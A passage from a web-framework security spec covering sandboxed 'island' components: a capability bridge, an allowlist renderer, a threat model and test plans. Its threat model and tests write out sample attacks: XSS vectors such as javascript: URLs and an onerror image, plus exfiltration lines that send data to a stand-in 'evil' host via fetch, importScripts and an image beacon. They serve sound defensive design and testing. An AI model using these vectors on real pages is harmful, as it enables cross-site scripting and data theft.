`op`/`topic` parse (CON-5001); `(topic, op-direction)` is in the island's grant table
(REQ-5016); `value`/`tree` passes the prototype check + null-proto normalisation + type/allowlist
recognition above; size/rate within NFR-5002; the bridge's subscriptions count against the same
global caps (NFR-5002) and are released on teardown (REQ-5017).
**Post-conditions:** a conforming, granted request is forwarded to the real bus; a granted
`subscribe` is answered `ack` then value-change-only `update`s (REQ-5021, each re-recognised);
an **`unsubscribe` SHALL actually release the underlying store subscription** — it MUST call the
real `store(topic).subscribe()` teardown (so the bridge stops receiving `update`s) **and free the
island's global subscriber-budget slot** (NFR-5002), **not** merely clear debounce/last-delivered
state; an `unsubscribe` that leaves the underlying subscription live (a leak) is non-conformant.
A `render` (default mode) is painted by the host via the allowlist (REQ-5025); a refusal is
answered `denied` + reason (so silence ≠ denial — closes the probe oracle); a torn-down island
(terminated `Worker` / closed `port1`, REQ-5017) drops messages silently.
**Error model:** message from an unknown/torn-down handle → ignored; ungranted topic/direction →
`denied:ungranted` (+ `island-capability-denied`); prototype/type failure → `denied:type`
(+ `island-payload-type`); a `render` with a non-allowlisted node → `denied:render` (offending
node dropped, never painted); cap breach → `denied:cap-exceeded`; malformed → `denied:malformed`.
No inbound message ever reaches the bus or the DOM without passing all checks.
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5016]], [[SPEC-050-component-islands-and-messaging#REQ-5017]], [[SPEC-050-component-islands-and-messaging#REQ-5025]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5016]], [[SPEC-050-component-islands-and-messaging#TEST-5025]].

### CON-5007: Controlled-Element Tree Grammar + Host Renderer
**Interface:** the normative recogniser + renderer for a `render` message's `tree`
([[SPEC-050-component-islands-and-messaging#CON-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5025]]).
This is **load-bearing for Threat M**, not an IMPL detail: the "closed by construction" claim
holds **iff** this contract holds. Because `tree` is **recursive** — unlike a `value`, which
CON-5005 defines as flat/non-recursive — it is recognised by a **distinct, bounded,
cycle-aware** recogniser (the CON-5005 "one shared recogniser" claim covers scalar/record
*values*, NOT the tree; this is the one place a second recogniser is required, and it is
specified here).

**Grammar (HTML namespace only — SVG/MathML/foreign content rejected):**
```
tree   = elem | text-string ;
elem   = { tag, props, children, key? } ;
tag    ∈ ELEM-ALLOWLIST                 (* closed default-DENY set; see below *)
props  = { (attr → attr-value) }        (* attr ∈ ATTR-ALLOWLIST(tag); value per attr-grammar *)
children = [ tree ]                     (* recursive *)
key    = string                         (* OPTIONAL reconciliation identity (REQ-5029); NOT rendered as an attribute *)
```
**Element allowlist (`ELEM-ALLOWLIST`)** is a **closed, default-deny** set the theme declares;
it MUST exclude (hard, non-overridable) every script-/embed-/form-/foreign-content element:
`script`, `style`, `iframe`, `object`, `embed`, `applet`, `form`, `input`, `button[type=submit]`-as-form,
`template`, `noscript`, `svg`, `math`, `foreignObject`, `base`, `meta`, `link`. A `tag` not in
the allowlist → **node dropped** (`denied:render`), never coerced.
**Attribute handling** — name allowlisting is **insufficient**; values are recognised:
- `on*`, `is`, `srcdoc`, `name`, `style`, `xlink:*`, any event/`form*` attribute → **hard-forbidden**.
- URL attributes (`href`, `src`, `srcset`, `poster`, `action`, `formaction`, `cite`) →
  **validated by parsing, not regex (normative, as implemented):** the renderer SHALL parse the
  value with **`new URL(value, pageBase)`** and **assess `.protocol`/`.origin`**, never
  pattern-match the raw string. `https`, `http`, `mailto`, and relative URLs only; **any** non-
  `http(s)` scheme (`javascript:`, `data:`, `blob:`, `vbscript:`, `file:`, `mailto:` in a
  fetch/`src` context) → rejected.
- **Egress-taint rule (closes the renderer exfil channel, Threat N).** A remote `src`/`srcset`/
  `poster`/`href` the *host document* fetches is an egress path the worker's confinement cannot
  see. Therefore an island that holds **any granted trusted-topic read** ([[theme.island-grants]])
  — a **read-granted** island, i.e. one that subscribes *any* trusted topic — MAY emit only
  **same-origin / relative** URL attributes; **any** of the following in its render tree is
  **rejected** so it cannot beacon a subscribed value out: a **non-`http(s)` scheme** (e.g.
  `mailto:`); any **cross-origin** `http(s)` URL; and any **protocol-relative** URL (**all** slash
  mixes — `//`, `\\`, `/\`, `\/`). Because validation is by parsing `.origin`, an obfuscated or
  scheme-confused string cannot slip past. (A *read-free* content island may use remote URLs,
  still bounded by the page `img-src`/`media-src` CSP of REQ-5026.)
- `aria-*` and `role` → **allowlisted** (required for the REQ-5020 a11y contract).
- all other attrs → only if in `ATTR-ALLOWLIST(tag)`, value rendered as a string via
  **`setAttribute`** (never DOM-property assignment, never string concatenation into markup).
- text nodes → inserted via **`textContent`** only.
**Bounds (fail-closed `denied:render`):** max depth `D`, max children-per-node `B`, max total
nodes `N`, max total text bytes `T` (`[Provisional]`, IMPL-050); a **cyclic** structured-clone
graph (a back-reference, which structured clone *preserves*) → rejected (visited-set tracked);
the materialised tree counts against the NFR-5002 per-message inbound cap.
**Pre-conditions:** the host holds a non-empty, well-formed allowlist; **a missing / empty /
malformed allowlist → render nothing (fail-closed)**, never a permissive default.
**Post-conditions:** a DOM subtree built only from allowlisted tags/attrs with validated URL
schemes, via `setAttribute`/`textContent`; no node the worker supplied can introduce HTML,
script, event handler, or dangerous URL — **Threat M holds**.
**Error model:** non-allowlisted tag/attr, bad URL scheme, depth/breadth/node/byte overflow, or
a cycle → that node dropped + `denied:render` carrying a node locator (so the worker can
self-correct); a missing allowlist → whole message dropped + diagnostic.
**Implements:** [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#REQ-5022]].
**Verified by:** [[SPEC-050-component-islands-and-messaging#TEST-5025]].

---

## 8. Threat Model

Trust boundary: **theme/component authors are trusted** (they ship in-realm JS);
**content-author island code is untrusted** and runs in an isolated realm — a **Worker**
(default) or a sandboxed iframe (escape hatch) — reaching the bus only through a capability
bridge (REQ-5010/5015/5016/5025); **`localStorage`/cross-tab values and all inbound bridge
messages are untrusted input** crossing into the runtime. (Threat letters align with
[[SPEC-048]]'s threat model for cross-spec parity; **G is intentionally unused** here —
SPEC-048's Threat G has no SPEC-050 analogue. Threats **I/J** are *iframe-escape-hatch-only*;
the default Worker mode does not have a sandbox-escape or a `null`-origin-spoofing surface.)

### Threat A: Island-Bus Escalation via a Content Author
A markdown author ships a content island trying to read/forge/overwrite a trusted topic
(`theme`) on `window.zetl`. **Mitigation (defense in depth, three legs):** (1) **realm
isolation** — the island runs with no reference to the parent realm or `window.zetl`: a
**Worker** has no DOM/`window` at all (default, REQ-5025), or an opaque-origin sandboxed
iframe holds no parent reference (escape hatch, REQ-5015); (2) **capability scoping** — its
only authority is its bridge handle (a `Worker` it doesn't control, or a transferred port)
whose grant table the parent enforces on every message; trusted-topic grants are
subscribe-only and theme-declared, so it can at most *read* `theme`, never *write* it
(REQ-5016); (3) **payload typing** — even granted messages must conform to the topic's
declared type (REQ-5013), and in the default mode it cannot emit HTML at all (Threat M closed
by construction, REQ-5025). String-namespacing is a clarity aid, explicitly **not** the
boundary (ADR-5003). Supersedes the v0.1.0 forbid-only mitigation.

### Threat B: Silent Mis-Wiring (Topic Typo)
A `subscribes`/`publishes` magic-string typo silently breaks coordination. **Mitigation
(coverage differs by tier — see REQ-5008):** for a **content island** the manifest *is* the
enforced capability set, so wiring is verified exactly (`island-topic-unpublished` /
`-malformed`, and ungranted/unsandboxed errors). For a **trusted island** the check is a
**best-effort AST lint** over literal `store("…")`/`emit("…")` arguments — literal typos are
caught, but computed topics are not, so the audit graph (REQ-5009/OBS-5001) is
*declaration-complete*, not *behaviour-complete*, for trusted islands. This is a build-time
coordination aid, not a runtime guarantee.

### Threat C: `localStorage` Poisoning / Cross-Tab Injection
A persisted value written by another tab/extension/version is malformed, oversized, or a
hostile payload, hoping to be applied raw on read or `storage` event. **Mitigation:**
CON-5004 recognises every stored value before application; non-conforming/oversized values
are discarded for the declared default and overwritten — storage is treated as untrusted
input ([[PROTO-001]] §LangSec).

### Threat D: Bus Resource Exhaustion
An island registers unbounded topics/subscribers or sets a huge retained value to exhaust
memory. **Mitigation:** NFR-5002 fail-closed bounds; over-cap operations dropped with a
diagnostic.

### Threat E: Script Injection via an Island Module
A hostile `<name>.js`. **Mitigation:** a *trusted* island is theme-author code (same
posture as [[SPEC-048]] ADR-4801 for CSS) and runs in-realm. A *content* island is
untrusted but confined to the iframe sandbox (REQ-5015), so hostile code there cannot reach
the parent realm, the DOM, or the bus except through the capability bridge.

### Threat F: Flash of Wrong Theme (FOUC) as a UX Defect
The persisted theme applies only after async hydration, flashing the wrong theme.
**Mitigation:** declared default + inline render-blocking pre-paint set (REQ-5006,
ADR-5005). Listed as a threat because a first-paint regression is a real, observable defect
the design must prevent.

### Threat H: Payload Type Confusion
A publisher (or a poisoned persisted/bridged value) sends a value of the wrong *shape* for a
topic, hoping a subscriber mis-handles it (e.g. an object where `theme` expects
`enum("light","dark")`). **Mitigation:** REQ-5013 / CON-5005 recognise every payload against
the topic's declared type at the persisted-read path and the bridge; non-conforming values
are dropped/defaulted, never delivered. **Scope (do not over-read):** this prevents *shape*
confusion only — a value that *conforms* to its type is still untrusted for output contexts;
that residual is [[SPEC-050-component-islands-and-messaging#Threat M]], not this threat.

### Threat M: XSS via a Conformant Value Through the Sanctioned Bridge
An untrusted content island publishes a **type-valid** value on its granted `content:` topic
that a trusted subscriber then injects into a DOM/HTML/URL sink (e.g. `innerHTML`) — markup
authored in markdown reaching the trusted realm *through* the bridge, defeating the sandbox.
**Mitigation:** in the **default controlled-element mode** (REQ-5025/ADR-5010) this is closed
**by construction *given the CON-5007 renderer contract*** — an untrusted island never produces
HTML or a free-text value rendered as markup; it emits a declarative element tree the host
paints per [[SPEC-050-component-islands-and-messaging#CON-5007]] (closed default-deny element
set; URL-scheme-validated attributes; `style`/`on*`/`is` forbidden; `setAttribute`/`textContent`
only; fail-closed on a missing allowlist). **The guarantee is exactly as strong as CON-5007** —
a name-only or fail-open allowlist would re-admit `href="javascript:…"`-class XSS, which is why
CON-5007 is normative, not deferred. In the **opt-in iframe full-DOM mode**, defense in depth
(REQ-5022): (1) **producer restriction** — a content island may
publish only `bool`/`int`/`number`/`enum(...)` topics, never free `string`/`string`-record
(`island-content-value-type`, build error); (2) **subscriber obligation** — subscribers treat
delivered values as untrusted text (`textContent`, never `innerHTML`; no raw `javascript:`/
`data:` URLs). Recognition (Threat H) checks type, not output safety; the controlled-element
model (default) or these two (escape hatch) close the value-flow path it does not.

### Threat I: iframe Sandbox Escape / Escalation *(escape-hatch mode only)*
*Applies only to the opt-in iframe full-DOM mode (REQ-5015); the default Worker mode has no
DOM/top-frame/popup surface to escape to.* A content island tries to break out of the sandbox
— navigating the top frame, opening popups, or reaching the parent DOM. **Mitigation:** the
`sandbox` token set grants only `allow-scripts` (no `allow-same-origin`, `allow-top-navigation`,
`allow-popups`, `allow-modals`), and a restrictive CSP confines network/inline execution
(REQ-5015); the opaque origin denies same-origin DOM/storage access by construction.

### Threat J: `postMessage` Spoofing / Confused-Source Injection *(escape-hatch mode only)*
*In the default Worker mode this threat does not exist:* a `Worker` is addressed by the object
reference the parent holds, no other context can post to it, and there is no
`origin`/`source`/`null`-frame surface — spoofing is impossible by construction. The threat
exists only across the iframe escape hatch's opaque-origin boundary, where a script (another
`"null"`-origin frame, an extension, or a stale/torn-down island) posts messages to the bridge
pretending to be a granted island. **Note the trap this corrects:**
a sandboxed iframe's `MessageEvent.origin` is the literal `"null"` for *every* such frame
and channel-port messages carry `source === null`, so **origin/source checks are
non-discriminating on the transferred port and are explicitly NOT the per-message mechanism**.
**Mitigation (two stages, REQ-5016/CON-5006):** (1) the **bootstrap** `zetl:ready` is routed
by **`event.source` `WindowProxy` identity** — the parent created each iframe and holds its
`contentWindow`, and a frame cannot forge another frame's `WindowProxy`, so a hostile
`"null"`-origin frame's `zetl:ready` is a registry miss → no-op (the `zetl:ready` payload is
ignored for routing, so it cannot claim a sibling's slot); (2) after the **targeted** port
transfer (preceded only by that window-level ready), the bridge accepts bus messages **only on
each island's own `port1`** (`WeakMap<port1, Island>`). A child-ready-first bootstrap *is*
required — a blind first-message transfer would race the child's listener install — and it is
the spec's one identity ceremony. A torn-down island's `port1` is **closed and its registry +
WeakMap entries deleted** (REQ-5017), and a remount gets a brand-new iframe+channel, so a
stale port can never be confused with a live one. Window-source for the ready, port-object
identity thereafter — never origin.

### Threat K: Capability Over-Grant, Over-Read, or Relay Flooding
A theme grants a content island more authority than intended (e.g. publish on `theme`), or a
*granted* subscribe is abused as an oracle — finely timing trusted-topic updates to
side-channel user activity, or a high-frequency trusted publisher floods the island.
**Mitigation:** trusted-topic publish grants are **inexpressible** in the manifest grammar
(subscribe-only, CON-5002); content islands publish only `content:` topics; grants are
theme-declared and enumerated in the audit graph (REQ-5009/OBS-5001). For the granted-read
risk the bridge relays **value-change-only**, deduplicated and debounced (REQ-5021) — which
bounds flooding and coarsens the timing channel to value *transitions* (it does **not**
eliminate it). The spec records honestly that a granted subscribe **is a full read** of that
topic plus a residual change-rate signal; it is a capability the theme grants consciously and
the operator can see in the audit graph. **A granted read is only *local* if egress is
confined:** in the default Worker mode the island has ambient `fetch`, so a granted
`subscribe theme` would be a direct exfiltration channel unless REQ-5026's `connect-src 'none'`
holds — REQ-5021's debounce coarsens the *timing* channel but does nothing about a *data*
channel ([[SPEC-050-component-islands-and-messaging#Threat N]]). The parent bridge is the sole
reference monitor — no island can widen its own grant (REQ-5016).

### Threat N: Content-Worker Egress / Remote Code Pull *(default mode)*
A content island's Worker exfiltrates a value it legitimately received (a granted trusted-topic
`subscribe`) via **three distinct channels**: (a) **direct worker network** —
`fetch`/`XHR`/`WebSocket`; (b) **remote code pull** — `importScripts('//evil')`, defeating the
build audit + integrity pin; (c) **the renderer** — encoding the value into an allowlisted
remote URL (`<img src="https://evil/?d=…">`) that the **host document**, not the worker, fetches.
"No DOM" (ADR-5010) is **not** "no network," and the worker's own confinement does **not** cover
channel (c). **Mitigation (REQ-5026, corrected from v0.11.0's unimplementable per-worker CSP):**
confinement is the **host-document CSP** the trusted operator ships (`<meta http-equiv>` works on
static/`file://` without a server; the `blob:`/same-origin worker **inherits** the document
policy — there is no per-worker inline CSP): restrictive `connect-src` + `worker-src` close (a),
remote-excluding `script-src` closes (b), and `img-src`/`media-src`/`font-src`/`style-src` plus
the **CON-5007 egress-taint rule** (a read-granted island may emit only same-origin URLs) close
(c). The worker script is **integrity-pinned by content hash before `new Worker`** (SRI does not
apply). Egress widening is a **trusted** page-CSP decision (audit graph), never a content-author
field. **Honest residual:** the guarantee requires the operator to ship the CSP; `file://`
enforcement is browser-dependent (best-effort there); and local same-origin **storage**
(IndexedDB/Cache) is not CSP-gated at all — see [[SPEC-050-component-islands-and-messaging#REQ-5010]].

### Threat L: Compromised / Supply-Chained Trusted Island
A trusted in-realm island ships malicious or supply-chain-compromised JS — it has ambient
`window.zetl` authority and could replace bus primitives, read every retained value, or
publish any topic. **Mitigation (blast-radius reduction, not elimination):** the shell
**deep-freezes** the `window.zetl` capability (its methods and any exposed sub-objects;
internal topic state is closed over, not a frozen-but-mutable object) before any island runs
so primitives can't be replaced, and every island `<script>` carries **SRI** so a substituted
asset fails to load (REQ-5019). Residual risk is explicit and accepted: a trusted island is
first-party code by definition; full defense would require sandboxing trusted islands too,
which is out of scope (theme authors are the trust root, as for theme CSS/templates in
[[SPEC-048]]). Operators reduce residual risk by vetting theme islands and avoiding remote
island imports.

---

## 9. Test Specifications

> Positive / negative-input / negative-output per [[PROTO-001]] §9. AI-synthesised spec →
> adversarial testing is **mandatory** before convergence; browser-level tests reuse the
> [[SPEC-028]] harness.

### TEST-5001: Gated Deduped Deterministic Emission
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5001]], [[SPEC-050-component-islands-and-messaging#NFR-5003]]. Positive: a JS-bearing component used 3× emits one module script. Negative-input: a page with no JS component emits no island script. Negative-output: two builds are byte-identical (stable order).

### TEST-5002: Progressive Enhancement
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5002]]. Positive: component renders + enhances with JS on. Negative-input: JS disabled → static HTML+CSS renders and is usable. Negative-output: no island-only content is missing from the static/indexed HTML.

### TEST-5003: SPA Hydration + Re-Hydration + Latency
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5003]], [[SPEC-050-component-islands-and-messaging#NFR-5001]]. Positive: islands hydrate on load; re-hydrate after a client-side nav. Negative-input: an already-hydrated node is not double-bound. Negative-output: hydration latency breach fails the NFR gate.

### TEST-5004: Bus Presence + Bounds
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5004]], [[SPEC-050-component-islands-and-messaging#CON-5003]], [[SPEC-050-component-islands-and-messaging#NFR-5002]]. Positive: `window.zetl.store`/`bus` exist when an island is present. Negative-input: over-cap topics/subscribers dropped with a diagnostic, no throw. Negative-output: `bus` does not retain (a later subscriber gets nothing).

### TEST-5005: Replay-on-Subscribe vs Ephemeral
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5005]], [[SPEC-050-component-islands-and-messaging#REQ-5007]]. Positive: a subscriber mounting AFTER `store('theme').set('dark')` — and one re-hydrated after a simulated nav — both read `'dark'`. Negative-input: unchanged `set` coalesces. Negative-output: a `bus.emit` fired before any listener existed is NOT replayed (distinguishes `bus` from `store`).

### TEST-5006: Persisted Topics + Untrusted-Storage Recognition
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5006]], [[SPEC-050-component-islands-and-messaging#CON-5004]], [[SPEC-050-component-islands-and-messaging#Threat C]]. Positive: a persisted `theme` round-trips `localStorage` and reflects a `storage` event. Negative-input: a malformed/oversized stored value is discarded for the declared default (not applied raw); `persisted` without `default` → `island-persisted-no-default`. Negative-output: no flash — the pre-paint script applies the stored value before first paint (HP6).

### TEST-5007: Single Bus Instance Survives Navigation
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5007]]. Positive: across a client-side navigation, `window.zetl` is the **same** object instance (no second bus), a subscription registered before the nav still fires after, and a retained value set before the nav is still readable after. Negative-input: a navigation does not reset retained store values. Negative-output: there is never more than one live bus instance on the page (assert object identity stable across N navigations).

### TEST-5008: Manifest Topics + Wiring Verification + Graph
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5008]], [[SPEC-050-component-islands-and-messaging#REQ-5009]], [[SPEC-050-component-islands-and-messaging#CON-5002]]. Positive: publisher/subscriber pair resolves; wiring graph shows the edge. Negative-input: malformed topic → `island-topic-malformed`; subscriber with no publisher → `island-topic-unpublished` (warning); island publishing an undeclared topic → `island-topic-undeclared` (warning); content island subscribing a trusted topic with no grant → `island-capability-ungranted` (error). Negative-output: the graph lists every dangling edge.

### TEST-5010: Two Trust Tiers — In-Realm vs Isolated (Both Render Modes)
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#Threat A]]. Positive: a theme island runs in-realm with direct `window.zetl`; a **default** content island runs in a **Worker** (no DOM, no `window.zetl`); an `render="iframe"` content island runs in a sandboxed iframe. Negative-input: a content component publishing a non-`content:` topic → build error (any mode); `sandbox` on a `render="worker"` island → `island-render-invalid`; missing `sandbox=true` on a `render="iframe"` island → `island-content-unsandboxed` (iframe-mode-scoped only). Negative-output: neither a content Worker nor a content iframe can reach the parent `window.zetl` (Worker has no `window`; iframe is opaque-origin).

### TEST-5013: Typed Payload Recognition
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5013]], [[SPEC-050-component-islands-and-messaging#CON-5005]], [[SPEC-050-component-islands-and-messaging#Threat H]]. Positive: an `enum("light","dark")` `theme` accepts `"dark"`. Negative-input: `set("blue")` or an object → `island-payload-type`, dropped, subscribers unaffected; two publishers declaring incompatible types → `island-topic-type-conflict` at build. Negative-output: no subscriber, persisted read, or bridge delivery ever yields an unrecognised value.

### TEST-5015: Content-Island iframe Sandbox
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5015]], [[SPEC-050-component-islands-and-messaging#Threat I]]. Positive: the island enhances inside the sandboxed iframe. Negative-input: sandbox token set lacks `allow-same-origin`/`allow-top-navigation`/`allow-popups`; CSP present. Negative-output: with JS off or sandbox unsupported, the parent-document static HTML renders, is usable, and is indexable; a top-navigation/parent-DOM attempt from inside fails.

### TEST-5016: Capability Bridge — Grants (both modes) + iframe-Escape-Hatch Bootstrap
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5016]], [[SPEC-050-component-islands-and-messaging#CON-5006]], [[SPEC-050-component-islands-and-messaging#Threat A]], [[SPEC-050-component-islands-and-messaging#Threat J]], [[SPEC-050-component-islands-and-messaging#Threat K]]. The **grant checks apply to both transports** (run the grant matrix once per mode): a `Worker`-handle message and a `port1` message are each accepted only when `(topic, direction)` is granted. The **bootstrap/port-identity assertions below are escape-hatch (iframe) only** — the default Worker mode has no bootstrap, no `event.source`, no port (TEST-5025 covers worker identity). *iframe path —* Positive: the child posts `zetl:ready`; the parent (matching `event.source` to that island's `iframe.contentWindow`) transfers `port2`; the island then publishes its `content:filter` grant and reads a theme-granted `theme` subscribe (`ack` then value-change-only `update`s). **Bootstrap negative:** a `zetl:ready` whose `event.source` is **not** the expected iframe `contentWindow` → ignored (no port transferred); if no `zetl:ready` arrives within the timeout → one retry, then teardown (no hang). **Grant negative:** publishing `theme` (no publish grant) or any ungranted topic → `denied:ungranted`; a publish grant for a trusted topic is unexpressible in the manifest grammar. **Identity negative (note the two stages):** *on the transferred port*, a message arriving on any `port1` not in the `WeakMap` is ignored and an `origin`/`source` check would NOT discriminate (port `source` is `null`); *for the window-level `zetl:ready`*, `event.source` `WindowProxy` identity **IS** the discriminator and a `zetl:ready` from a foreign frame is a registry miss → no-op. The test asserts both — source is useless on the port, decisive on the ready. Negative-output: no ungranted/type-invalid message reaches the bus (fuzz the `postMessage` protocol incl. `__proto__`/poisoned-prototype structured-clone payloads).

### TEST-5017: Island & Port Lifecycle Under SPA Nav
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5017]], [[SPEC-050-component-islands-and-messaging#Threat J]]. Positive: navigating away deletes the registry/`WeakMap` entries, closes `port1`, cancels pending relays, and destroys the iframe; navigating back issues a fresh iframe+port+grant and re-hydrates idempotently. Negative-input: a `message` event already dispatched before `close()` is dropped by the **WeakMap-miss** check (not by `close()`); a debounced `update` that fires after teardown is a no-op (relay re-checks membership) and **throws nothing**. Negative-output: repeated nav cycles do not grow the subscriber count toward the NFR-5002 cap (assert bounded after N cycles); a retained store value survives the nav (REQ-5007) while subscriptions do not.

### TEST-5018: Persisted Pre-Paint Script
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5018]], [[SPEC-050-component-islands-and-messaging#CON-5005]], [[SPEC-050-component-islands-and-messaging#Threat F]]. Positive: a returning visitor's persisted `theme` is applied before first paint (no flash); the snippet is admitted by its `'sha256-…'` CSP source. Negative-input: a poisoned/oversized/`null` stored value → declared default applied, no exception escapes the `try/catch`. Negative-output: the snippet never interprets the stored string as code/markup; a page with no persisted topic and no island emits no pre-paint script (REQ-5012).

### TEST-5019: Island Asset Hardening (Mode-Aware Integrity)
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5019]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#Threat L]]. Positive: `window.zetl` is frozen before islands run; trusted + iframe-mode island `<script>`s carry SRI `integrity`; a **content Worker** script is pinned by the REQ-5026 **content-hash-before-`new Worker`** check (SRI does not apply to `new Worker`). Negative-input: `window.zetl.store = …` fails (frozen); a tampered `<script>` asset (SRI mismatch) fails to load; a tampered **Worker** script (hash mismatch) → island does not start. Negative-output: a later island still sees genuine `store`/`bus` primitives after a mutation attempt.

### TEST-5020: Island Accessibility (Both Render Modes)
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5020]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#REQ-5002]]. Positive (default Worker): the painted subtree sits inline in document tab order, and CON-5007 admits the `aria-*`/`role` needed for accessible names. Positive (iframe escape hatch): the iframe carries a meaningful `title` and sits in document tab order. Negative-input: an island that auto-focuses/traps focus → `island-focus-trap` warning (either mode). Negative-output: information surfaced only after hydration has a no-JS parent-HTML equivalent (WCAG 2.2 AA).

### TEST-5022: Recognition ≠ Output Safety
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5022]], [[SPEC-050-component-islands-and-messaging#Threat M]]. Positive: a content island manifest publishing only `bool`/`int`/`number`/`enum` content topics builds. Negative-input: a content island declaring a `string`-typed (or string-bearing record) **published** topic → `island-content-value-type` build error. Negative-output: a conformant `string` value (e.g. `"<img onerror=…>"`) delivered to a subscriber is inert when the subscriber follows the obligation (assert `textContent` rendering, not `innerHTML`); the producer-restriction means no untrusted-authored value can be free text.

### TEST-5025: Controlled-Element Renderer (CON-5007) — Threat M Closure
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#CON-5007]], [[SPEC-050-component-islands-and-messaging#ADR-5010]], [[SPEC-050-component-islands-and-messaging#Threat M]]. Runs against the **normative CON-5007 allowlist** (not an IMPL-deferred one). Positive: a `paints`-granted island renders an allowlisted tree painted via `setAttribute`/`textContent`, inline with page CSS, with `aria-*`/`role` preserved (REQ-5020). Negative-input — **full vector matrix**, each dropped (`denied:render` + node locator), nothing painted: non-allowlisted tag (`script`/`iframe`/`object`/`form`/`template`/`svg`/`math`); forbidden attr (`on*`/`style`/`is`/`srcdoc`/`name`/`xlink:*`); URL-scheme attacks (`href="javascript:…"`, `src="data:…"`, `formaction="blob:…"`, `srcset`); `__proto__`/poisoned-prototype node; a **tree bomb** (over-deep / over-wide / over-node-count → bounded, no main-thread hang) and a **cyclic structured-clone** tree (rejected, no infinite loop); a `render` from an island **without** the `paints` grant (M2 — denied, headless cannot paint); a **missing/empty host allowlist** (whole message dropped, fail-closed — never a permissive default). Worker has no `document`/`window`/`localStorage` (assert undefined). Negative-output: **no path produces HTML/script/handler/dangerous-URL from untrusted code** (Threat M holds *because* CON-5007 holds); identity needs no `event.source`/bootstrap.

### TEST-5026: Content-Worker Confinement (Egress, Integrity, Render Rate)
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]]. Run under the **host-document CSP** the build emitted (REQ-5027), which the Worker inherits — *not* a per-worker policy. Positive: with the baseline (`connect-src 'none'`) the worker cannot `fetch`/open a `WebSocket`/`importScripts('//remote')`; a `[security.csp]`-declared `connect-src` host permits only that host and shows in the audit graph. Negative-input — **the key exfil case across all three channels (Threat N)**: an island granted `subscribe theme` whose worker (a) `fetch('//evil?'+value)` → blocked by `connect-src`; (b) `importScripts('//evil')` → blocked by `script-src`; (c) emits `render` with `<img src="https://evil/?d="+value>` → blocked by **both** `img-src` **and** the CON-5007 same-origin egress-taint rule for read-granted islands (assert no request leaves on any channel). Integrity: a tampered worker script (hash mismatch) → island does not start. Render-rate: `for(;;) postMessage({op:'render',…})` is coalesced/capped (≤ one paint/frame; breach → `denied:cap-exceeded`). Negative-output: a granted read cannot leave the page on any channel while the baseline holds.

### TEST-5027: CSP Declaration, Computation & Emission
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5027]]. Positive: a page with a content island emits a `<meta http-equiv="Content-Security-Policy">` as the **first `<head>` child** whose policy equals the build-computed baseline ∪ `[security.csp]` widenings, and a byte-equal `csp-headers` artifact; the effective policy + each widening's source appear in the audit graph. Negative-input: **no `[security.csp]` declared** → the page still emits the **default-deny baseline** (`connect-src 'none'`, etc.), NOT an absent CSP (fail-closed); a `[security.csp]` value of `"*"` → build error `csp-wildcard`; a **content-island page with CSP emission somehow suppressed** → build error (mandatory). Negative-output: a content-author manifest cannot set any CSP directive (B2); the `<meta>` and headers artifact never drift (same computed source).

### TEST-5028: Author Capability Requests (Request → Approve → Audit)
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5028]], [[SPEC-050-component-islands-and-messaging#REQ-5027]]. Positive: an island's `[island.requests]` `connect-src` host **with** a matching `[security.csp]` entry → the host is reachable and the audit graph shows the request `approved` (with `reason`); a `bundles` lib is vendored into the integrity-pinned worker bytes. **Negative-input — the key fail-closed case:** an `[island.requests]` `connect-src` host with **no** matching `[security.csp]` approval → runtime egress still **blocked** (baseline `connect-src 'none'` holds), audit shows `unapproved` + `island-request-unapproved` warning (not an error; island still runs). Negative-output: an `[island.requests]` entry **never** widens the computed CSP on its own (assert the emitted policy is identical with and without an unapproved request); no runtime CDN `importScripts` path exists even for a `bundles`-listed lib.

### TEST-5029: Dynamic Update via Host Reconciliation
**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5029]], [[SPEC-050-component-islands-and-messaging#CON-5007]]. Positive: a worker re-emits a `render` with a changed tree → the host applies **minimal DOM mutations** (assert unchanged keyed nodes are not recreated); a keyed list re-order **moves** nodes (preserves their DOM identity); **focus and uncontrolled input value survive** a re-render of a keyed `<input>`. Negative-input: a re-render that exceeds CON-5007 bounds or includes a non-allowlisted node → that node dropped (`denied:render`), rest reconciles; `key` is **never** emitted as a DOM attribute. Negative-output: re-rendering on every keystroke is coalesced to ≤ one paint/frame (REQ-5026), main thread not saturated; zetl ships **no** VDOM framework runtime (assert no framework global, NFR-5002).

### TEST-5030: Message Ordering, Sequencing & Delivery Semantics
